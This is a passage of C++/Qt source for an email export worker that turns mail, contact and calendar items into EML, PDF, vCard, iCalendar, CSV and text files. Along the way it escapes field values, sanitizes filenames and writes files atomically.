// ============================================================================

void EmailExportWorker::cancel() {
    m_cancelled.store(true);
}

// ============================================================================
// EML Writer
// ============================================================================

bool EmailExportWorker::writeEml(sak::EmlWriter& writer,
                                 const sak::PstItemDetail& item,
                                 const QVector<QPair<QString, QByteArray>>& attachment_data,
                                 qint64& bytes_written,
                                 bool include_headers) {
    const qint64 before = writer.totalBytesWritten();
    // When eml_include_headers is false, strip the addressing fields on a local
    // copy so EmlWriter emits a body-only .eml (it always renders whatever headers
    // the item carries, and it is not ours to modify).
    sak::PstItemDetail stripped;
    const sak::PstItemDetail* source = &item;
    if (!include_headers) {
        stripped = item;
        clearEmlHeaderFields(stripped);
        source = &stripped;
    }
    auto write_result = writer.writeMessage(*source, attachment_data, {});
    if (!write_result.has_value()) {
        return false;
    }
    bytes_written += writer.totalBytesWritten() - before;
    return true;
}

bool EmailExportWorker::writeHtml(sak::HtmlEmailWriter& writer,
                                  const sak::PstItemDetail& item,
                                  const QVector<QPair<QString, QByteArray>>& attachment_data,
                                  qint64& bytes_written) {
    const qint64 before = writer.totalBytesWritten();
    auto write_result = writer.writeMessage(item, attachment_data, {});
    if (!write_result.has_value()) {
        return false;
    }
    bytes_written += writer.totalBytesWritten() - before;
    return true;
}

bool EmailExportWorker::writePdf(sak::PdfEmailWriter& writer,
                                 const sak::PstItemDetail& item,
                                 const QVector<QPair<QString, QByteArray>>& attachment_data,
                                 qint64& bytes_written,
                                 bool flatten_attachments) {
    const qint64 before = writer.totalBytesWritten();
    auto write_result = writer.writeMessage(item, attachment_data, {});
    if (!write_result.has_value()) {
        return false;
    }
    bytes_written += writer.totalBytesWritten() - before;
    if (!saveSidecarAttachments(
            attachment_data, write_result.value(), bytes_written, flatten_attachments)) {
        // A sidecar attachment failed: remove the .pdf so no partial artifact (a
        // message advertising attachments that are not on disk) is left behind.
        QFile::remove(write_result.value());
        return false;
    }
    return true;
}

// ============================================================================
// VCF (vCard 3.0) Writer
// ============================================================================

bool EmailExportWorker::writeVcf(const sak::PstItemDetail& contact,
                                 const QString& output_dir,
                                 int index) {
    const QByteArray content = buildVcfContent(contact);
    if (content.isEmpty()) {
        return false;
    }

    QString name_part = contact.given_name;
    if (!contact.surname.isEmpty()) {
        if (!name_part.isEmpty()) {
            name_part += QLatin1Char('_');
        }
        name_part += contact.surname;
    }
    if (name_part.isEmpty()) {
        name_part = QStringLiteral("contact_%1").arg(index);
    }
    name_part = sanitizeFilename(name_part, kMaxFilenameLength);

    QString filename = name_part + QStringLiteral(".vcf");
    filename = resolveFilenameConflict(output_dir, filename);

    QSaveFile file(output_dir + QLatin1Char('/') + filename);
    if (!file.open(QIODevice::WriteOnly)) {
        return false;
    }
    if (!sak::writeFully(file, content) || !file.commit()) {
        return false;  // A truncated .vcf is not a successful export.
    }
    return true;
}

QByteArray EmailExportWorker::buildVcfContent(const sak::PstItemDetail& contact) {
    QByteArray vcf;
    vcf += "BEGIN:VCARD\r\n";
    vcf += "VERSION:3.0\r\n";

    // N: Surname;Given name (each component escaped so a value cannot inject a
    // new structured field or property line)
    vcf += "N:" + escapeCalendarText(contact.surname).toUtf8() + ";" +
           escapeCalendarText(contact.given_name).toUtf8() + ";;;\r\n";

    // FN: Full name. FN is REQUIRED by RFC 6350; fall back to the (real) email
    // address as the formatted name, and fail closed (empty content) if there is no
    // name or address to identify the contact rather than emit an invalid vCard.
    QString full_name = contact.given_name;
    if (!contact.surname.isEmpty()) {
        if (!full_name.isEmpty()) {
            full_name += QLatin1Char(' ');
        }
        full_name += contact.surname;
    }
    if (full_name.isEmpty()) {
        full_name = contact.email_address;
    }
    if (full_name.isEmpty()) {
        return {};  // no identifying data -> caller treats as a failed contact
    }
    appendVcfField(vcf, "FN:", full_name);
    appendVcfField(vcf, "ORG:", contact.company_name);
    appendVcfField(vcf, "TITLE:", contact.job_title);
    appendVcfField(vcf, "EMAIL;TYPE=INTERNET:", contact.email_address);
    appendVcfField(vcf, "TEL;TYPE=WORK:", contact.business_phone);
    appendVcfField(vcf, "TEL;TYPE=CELL:", contact.mobile_phone);
    appendVcfField(vcf, "TEL;TYPE=HOME:", contact.home_phone);

    // Label the PHOTO with its detected type instead of assuming JPEG; skip an
    // unrecognized blob rather than mislabel it.
    const QString photo_type = detectPhotoType(contact.contact_photo);
    if (!contact.contact_photo.isEmpty() && !photo_type.isEmpty()) {
        vcf += "PHOTO;ENCODING=b;TYPE=" + photo_type.toUtf8() + ":" +
               contact.contact_photo.toBase64() + "\r\n";
    }

    vcf += "END:VCARD\r\n";
    return vcf;
}

// ============================================================================
// ICS (iCalendar) Writer
// ============================================================================

bool EmailExportWorker::writeIcs(const QVector<sak::PstItemDetail>& events,
                                 const QString& output_path) {
    const QByteArray content = buildIcsContent(events);
    // QSaveFile writes to a temp sibling and atomically renames on commit(), so a
    // failed write never truncates a previously valid .ics in place.
    QSaveFile file(output_path);
    if (!file.open(QIODevice::WriteOnly)) {
        return false;
    }
    if (!sak::writeFully(file, content) || !file.commit()) {
        return false;  // A truncated .ics is not a successful export.
    }
    return true;
}

QByteArray EmailExportWorker::buildIcsContent(const QVector<sak::PstItemDetail>& events) {
    QByteArray ics;
    ics += "BEGIN:VCALENDAR\r\n";
    ics += "VERSION:2.0\r\n";
    ics += "PRODID:-//SAK Utility//Email Export//EN\r\n";
    ics += "CALSCALE:GREGORIAN\r\n";

    // DTSTAMP is the object-creation time (the export moment): a legitimate value,
    // not a fabricated stand-in for missing data.
    const QByteArray dtstamp = toIcsDateTime(QDateTime::currentDateTimeUtc()).toUtf8();

    for (const auto& event : events) {
        ics += "BEGIN:VEVENT\r\n";

        // UID and DTSTAMP are REQUIRED by RFC 5545; a VEVENT lacking them is rejected
        // by strict consumers. Derive a stable UID from the message id or node id.
        const QString uid = event.message_id.isEmpty()
                                ? QStringLiteral("%1@sak-utility").arg(event.node_id)
                                : event.message_id;
        ics += "UID:" + escapeCalendarText(uid).toUtf8() + "\r\n";
        ics += "DTSTAMP:" + dtstamp + "\r\n";

        if (event.start_time.isValid()) {
            ics += "DTSTART:" + toIcsDateTime(event.start_time).toUtf8() + "\r\n";
        }
        if (event.end_time.isValid()) {
            ics += "DTEND:" + toIcsDateTime(event.end_time).toUtf8() + "\r\n";
        }
        if (!event.subject.isEmpty()) {
            ics += "SUMMARY:" + escapeCalendarText(event.subject).toUtf8() + "\r\n";
        }
        if (!event.location.isEmpty()) {
            ics += "LOCATION:" + escapeCalendarText(event.location).toUtf8() + "\r\n";
        }
        if (!event.body_plain.isEmpty()) {
            ics += "DESCRIPTION:" + escapeCalendarText(event.body_plain).toUtf8() + "\r\n";
        }

        for (const auto& attendee : event.attendees) {
            // CN is a parameter (DQUOTE-quoted), the mailto value is the CAL-ADDRESS.
            // Using TEXT escaping in the unquoted param context let a value inject
            // extra parameters; quote the param and strip controls from the address.
            const QString clean = stripControlChars(attendee);
            ics += "ATTENDEE;CN=" + icsParamQuote(attendee).toUtf8() + ":mailto:" + clean.toUtf8() +
                   "\r\n";
        }

        ics += "END:VEVENT\r\n";
    }

    ics += "END:VCALENDAR\r\n";
    return ics;
}

// ============================================================================
// CSV Writer
// ============================================================================

bool EmailExportWorker::writeCsv(const QVector<sak::PstItemDetail>& items,
                                 const QString& output_path,
                                 const QStringList& columns,
                                 QChar delimiter,
                                 bool include_header) {
    // QSaveFile writes to a temp sibling and atomically renames on commit(), so a
    // failed write never truncates a previously valid .csv in place.
    QSaveFile file(output_path);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        return false;
    }

    QTextStream stream(&file);
    stream.setEncoding(QStringConverter::Utf8);
    stream.setGenerateByteOrderMark(true);

    // Write header row (omitted when csv_include_header is false).
    if (include_header) {
        for (int col = 0; col < columns.size(); ++col) {
            if (col > 0) {
                stream << delimiter;
            }
            stream << csvEscape(columns[col], delimiter);
        }
        stream << "\r\n";
    }

    // Write data rows
    for (const auto& item : items) {
        for (int col = 0; col < columns.size(); ++col) {
            if (col > 0) {
                stream << delimiter;
            }
            stream << csvEscape(csvFieldValue(item, columns[col]), delimiter);
        }
        stream << "\r\n";
    }

    if (!textStreamOk(stream, file) || !file.commit()) {
        return false;  // A truncated/failed CSV write is not a successful export.
    }
    return true;
}

// ============================================================================
// Attachment Extraction
// ============================================================================

bool EmailExportWorker::extractAttachment(PstParser* parser,
                                          uint64_t msg_nid,
                                          const sak::PstAttachmentInfo& att,
                                          const QString& output_dir) {
    // Fetch by att.index (the attachment's real index property), NOT its position in
    // the attachments vector: a filtered/sparse list makes the two differ, and the
    // old code passed the loop position, extracting the WRONG blob (B7-26).
    auto data = parser->readAttachmentData(msg_nid, att.index);
    if (!data.has_value()) {
        return false;
    }

    QString filename = att.long_filename.isEmpty() ? att.filename : att.long_filename;
    if (filename.isEmpty()) {
        filename = QStringLiteral("attachment_%1_%2").arg(msg_nid).arg(att.index);
    }
    filename = sanitizeFilename(filename, kMaxFilenameLength);
    filename = resolveFilenameConflict(output_dir, filename);

    QFile file(output_dir + QLatin1Char('/') + filename);
    if (!file.open(QIODevice::WriteOnly)) {
        return false;
    }
    // Full write or fail: a truncated attachment must not count as extracted (B7-18).
    if (!sak::writeFully(file, data.value())) {
        file.close();
        return false;
    }
    file.close();
    return true;
}

// ============================================================================
// Filename Utilities
// ============================================================================

QString EmailExportWorker::sanitizeFilename(const QString& name, int max_length) {
    QString safe = name;

    // Replace Windows-forbidden characters
    static const QString kForbidden = QStringLiteral("<>:\"/\\|?*");
    for (const QChar forbidden : kForbidden) {
        safe.replace(forbidden, QLatin1Char('_'));
    }

    // Replace control characters
    QString result;
    result.reserve(safe.length());
    for (QChar character : safe) {
        if (character.unicode() >= kMinimumPrintableCodePoint) {
            result += character;
        }
    }
    safe = result;

    // Trim whitespace and dots from ends
    safe = safe.trimmed();
    while (safe.endsWith(QLatin1Char('.'))) {
        safe.chop(1);
    }

    // Truncate to max length
    if (safe.length() > max_length) {
        safe.truncate(max_length);
    }

    return safe;
}

QString EmailExportWorker::resolveFilenameConflict(const QString& dir, const QString& filename) {
    const QString full_path = dir + QLatin1Char('/') + filename;
    if (!QFile::exists(full_path)) {
        return filename;
    }

    const QFileInfo fi(filename);
    const QString base = fi.completeBaseName();
    const QString ext = fi.suffix();

    constexpr int kMaxConflictAttempts = 9999;
    for (int attempt = kFirstConflictAttempt; attempt <= kMaxConflictAttempts; ++attempt) {
        QString candidate = base + QStringLiteral("_%1").arg(attempt);
        if (!ext.isEmpty()) {
            candidate += QLatin1Char('.') + ext;
        }
        if (!QFile::exists(dir + QLatin1Char('/') + candidate)) {
            return candidate;
        }
    }

    // Numbered attempts exhausted: try a single timestamp-tagged candidate, but
    // only accept it if it does not already exist -- never overwrite via an
    // unchecked fallback (R5-P6-23). Append the extension only when present so an
    // extensionless name does not gain a trailing dot.
    QString ts_candidate = base + QLatin1Char('_') +
                           QString::number(QDateTime::currentMSecsSinceEpoch());
    if (!ext.isEmpty()) {
        ts_candidate += QLatin1Char('.') + ext;
    }
    if (!QFile::exists(dir + QLatin1Char('/') + ts_candidate)) {
        return ts_candidate;
    }

    // Even the timestamped name collides: fail closed with an empty name so the
    // caller's file open() fails rather than clobbering an existing file.
    return {};
}

// ============================================================================
// Helper: Plain text export (sticky notes)
// ============================================================================

bool EmailExportWorker::writePlainText(const PlainTextWriteRequest& request,
                                       qint64& bytes_written) {
    const auto& item = request.item;
    QString safe_sub = sanitizeFilename(item.subject, kMaxFilenameLength);
    if (safe_sub.isEmpty()) {
        safe_sub = QStringLiteral("message_%1").arg(request.index);
    }
    if (item.date.isValid()) {
        safe_sub = item.date.toString(QStringLiteral("yyyy-MM-dd")) + QLatin1Char('_') + safe_sub;
    }
    QString filename = safe_sub + QStringLiteral(".txt");
    filename = resolveFilenameConflict(request.output_dir, filename);
    const QString full_path = request.output_dir + QLatin1Char('/') + filename;

    // QSaveFile atomically renames on commit(), so a failed write leaves no
    // truncated .txt behind.
    QSaveFile file(full_path);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        return false;
    }
    QTextStream stream(&file);
    stream.setEncoding(QStringConverter::Utf8);
    appendPlainTextHeaders(stream, item, static_cast<int>(request.attachment_data.size()));
    stream << QStringLiteral("\r\n---\r\n\r\n");
    stream << item.body_plain;
    if (item.body_plain.isEmpty() && !item.body_html.isEmpty()) {
        stream << item.body_html;
    }
    if (!textStreamOk(stream, file) || !file.commit()) {
        return false;  // A truncated/failed .txt write is not a successful export.
    }
    const QFileInfo info(full_path);
    bytes_written += info.size();
    if (request.save_attachments &&
        !saveSidecarAttachments(
            request.attachment_data, full_path, bytes_written, request.flatten_attachments)) {
        // A sidecar attachment failed: remove the main .txt so no partial artifact
        // (message body without its promised attachments) is left on disk.
        QFile::remove(full_path);
        return false;
    }
    return true;
}

// ============================================================================
// Helper: Export all attachments for a message
// ============================================================================

EmailExportWorker::AttachmentCollection EmailExportWorker::collectAttachmentData(
    PstParser* parser,
    const sak::PstItemDetail& item,
    const sak::EmailExportConfig& config,
    sak::EmailExportResult& result) {
    AttachmentCollection out;
    if (parser == nullptr || item.attachments.isEmpty()) {
        return out;
    }
    out.data.reserve(item.attachments.size());

    for (int att_idx = 0; att_idx < item.attachments.size(); ++att_idx) {
        const auto& att = item.attachments.at(att_idx);
        if (config.skip_inline_images && !att.content_id.isEmpty()) {
            continue;
        }
        const QString name = attachmentDisplayName(att, att_idx);
        auto data = parser->readAttachmentData(item.node_id, att.index);
        if (!data.has_value()) {
            // Surface the loss AND count it so the caller marks the message a partial
            // export rather than a clean one (B7-25).
            result.errors.append(
                QStringLiteral("Attachment '%1' in item NID %2 could not be read and was omitted")
                    .arg(name)
                    .arg(item.node_id));
            ++out.dropped;
            continue;
        }
        out.data.append({sanitizeFilename(name, kMaxFilenameLength), data.value()});
    }

    return out;
}

EmailExportWorker::AttachmentCollection EmailExportWorker::collectMboxAttachmentData(
    MboxParser* parser,
    int message_index,
    const sak::PstItemDetail& item,
    const sak::EmailExportConfig& config,
    sak::EmailExportResult& result) {
    AttachmentCollection out;
    if (parser == nullptr || item.attachments.isEmpty()) {
        return out;
    }
    out.data.reserve(item.attachments.size());

    for (int att_idx = 0; att_idx < item.attachments.size(); ++att_idx) {
        const auto& att = item.attachments.at(att_idx);
        if (config.skip_inline_images && !att.content_id.isEmpty()) {
            continue;
        }
        const QString name = attachmentDisplayName(att, att_idx);
        auto data = parser->readAttachmentData(sak::MboxMessageIndex{message_index},
                                               sak::MboxAttachmentIndex{att.index});
        if (!data.has_value()) {
            result.errors.append(
                QStringLiteral("Attachment '%1' in message %2 could not be read and was omitted")
                    .arg(name)
                    .arg(message_index));
            ++out.dropped;
            continue;
        }
        out.data.append({sanitizeFilename(name, kMaxFilenameLength), data.value()});
    }

    return out;
}

bool EmailExportWorker::saveSidecarAttachments(
    const QVector<QPair<QString, QByteArray>>& attachment_data,
    const QString& exported_file_path,
    qint64& bytes_written,
    bool flatten_attachments) {
    if (attachment_data.isEmpty()) {
        return true;
    }

    // flatten_attachments: pool every message's attachments in one shared folder;
    // otherwise keep a per-message folder next to the exported file.
    const QFileInfo exported_info(exported_file_path);
    const QString attach_dir = flatten_attachments
                                   ? exported_info.absolutePath() + QStringLiteral("/attachments")
                                   : exported_info.absolutePath() + QLatin1Char('/') +
                                         exported_info.completeBaseName() +
                                         QStringLiteral("_attachments");
    const QDir dir;
    if (!dir.mkpath(attach_dir)) {
        return false;
    }

    bool all_saved = true;
    for (const auto& [name, data] : attachment_data) {
        QString safe_name = sanitizeFilename(name, kMaxFilenameLength);
        if (safe_name.isEmpty()) {
            safe_name = QStringLiteral("attachment");
        }
        safe_name = resolveFilenameConflict(attach_dir, safe_name);
        QFile file(attach_dir + QLatin1Char('/') + safe_name);
        if (!file.open(QIODevice::WriteOnly)) {
            all_saved = false;
            continue;
        }
        const qint64 written = file.write(data);
        if (written == data.size()) {
            bytes_written += written;
        } else {
            all_saved = false;
        }
    }
    return all_saved;
}

bool EmailExportWorker::exportAttachments(PstParser* parser,
                                          const sak::PstItemDetail& item,
                                          const QString& output_dir,
                                          const sak::EmailExportConfig& config,
                                          sak::EmailExportResult& result) {
    if (item.attachments.isEmpty()) {
        return true;
    }

    // flatten_attachments: extract straight into output_dir; otherwise into a
    // per-message subfolder so each message's attachments stay grouped.
    QString target_dir = output_dir;
    if (!config.flatten_attachments) {
        QString sub = sanitizeFilename(item.subject, kMaxFilenameLength);
        if (sub.isEmpty()) {
            sub = QStringLiteral("message_%1").arg(item.node_id);
        }
        target_dir = output_dir + QLatin1Char('/') + sub;
        if (!QDir().mkpath(target_dir)) {
            result.errors.append(QStringLiteral("Item NID %1: failed to create attachment folder")
                                     .arg(item.node_id));
            return false;
        }
    }

    int eligible = 0;
    int succeeded = 0;
    QStringList failed_names;
    for (int att_idx = 0; att_idx < item.attachments.size(); ++att_idx) {
        const auto& att = item.attachments[att_idx];
        if (!passesAttachmentFilter(att, config)) {
            continue;
        }
        ++eligible;
        if (extractAttachment(parser, item.node_id, att, target_dir)) {
            ++succeeded;
        } else {
            failed_names.append(attachmentDisplayName(att, att_idx));
        }
    }

    // A message with an eligible attachment that failed to extract must be recorded as
    // failed/partial, not silently counted complete because a sibling attachment succeeded.
    if (succeeded < eligible) {
        result.errors.append(QStringLiteral("Item NID %1: failed to extract attachment(s): %2")
                                 .arg(item.node_id)
                                 .arg(failed_names.join(QStringLiteral(", "))));
        return false;
    }
    return true;
}

// ============================================================================
// Helper: CSV field value extraction
// ============================================================================

QString EmailExportWorker::csvFieldValue(const sak::PstItemDetail& item, const QString& column) {
    const auto& map = csvFieldMap();
    auto iter = map.find(column);
    if (iter != map.end()) {
        return iter.value()(item);
    }
    return {};
}

// ============================================================================
// Helper: Default CSV columns
// ============================================================================

QStringList EmailExportWorker::defaultCsvColumns(sak::ExportFormat format) {
    switch (format) {
    case sak::ExportFormat::CsvEmails:
        return {QStringLiteral("Subject"),
                QStringLiteral("From"),
                QStringLiteral("From Name"),
                QStringLiteral("To"),
                QStringLiteral("Cc"),
                QStringLiteral("Date"),
                QStringLiteral("Has Attachments"),
                QStringLiteral("Importance"),
                QStringLiteral("Body Preview")};
    case sak::ExportFormat::CsvContacts:
        return {QStringLiteral("First Name"),
                QStringLiteral("Last Name"),
                QStringLiteral("Email"),
                QStringLiteral("Company"),
                QStringLiteral("Job Title"),
                QStringLiteral("Business Phone"),
                QStringLiteral("Mobile Phone"),
                QStringLiteral("Home Phone")};
    case sak::ExportFormat::CsvCalendar:
        return {QStringLiteral("Subject"),
                QStringLiteral("Start"),
                QStringLiteral("End"),
                QStringLiteral("Location"),
                QStringLiteral("All Day")};
    case sak::ExportFormat::CsvTasks:
        return {QStringLiteral("Subject"),
                QStringLiteral("Due Date"),
                QStringLiteral("Status"),
                QStringLiteral("% Complete")};
    default:
        return {};
    }
}

// ============================================================================
// Helper: CSV output filename
// ============================================================================

QString EmailExportWorker::csvFilename(sak::ExportFormat format) {
    switch (format) {
    case sak::ExportFormat::CsvEmails:
        return QStringLiteral("emails_export.csv");
    case sak::ExportFormat::CsvContacts:
        return QStringLiteral("contacts_export.csv");
    case sak::ExportFormat::CsvCalendar:
        return QStringLiteral("calendar_export.csv");
    case sak::ExportFormat::CsvTasks:
        return QStringLiteral("tasks_export.csv");
    default:
        return QStringLiteral("export.csv");
    }
}
